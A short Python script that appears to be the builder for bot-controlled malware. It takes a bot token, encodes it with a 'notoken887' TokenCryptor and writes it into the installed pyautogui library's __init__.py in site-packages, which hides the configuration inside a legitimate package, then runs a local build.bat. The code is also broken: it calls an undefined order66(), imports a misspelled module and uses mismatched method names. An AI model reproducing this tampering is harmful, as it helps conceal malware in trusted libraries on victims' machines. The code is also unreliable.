import os,sys
from notoken887.encryptor import TokenCryptor
import pyttsound
order66()
os.system("color 4")
bot_token=input("Enter your bot token: ")
c=TokenCryptor()
processed_token=c.proccess(bot_token)
pyautogui_path=os.path.join(os.path.dirname(os.__file__),"site-packages","pyautogui","__init__.py")
with open(pyautogui_path,"r",encoding="utf-8")as f:content=f.read()
lines=content.splitlines()
for i,line in enumerate(lines):
 if line.strip().startswith('builtins.bots=c.process'):
  lines[i]=f'builtins.bots=c.process("{processed_token}")'
with open(pyautogui_path,"w",encoding="utf-8")as f:f.write("\n".join(lines))
build_bat_path=os.path.join("l","build.bat")
os.system(f'"{build_bat_path}"')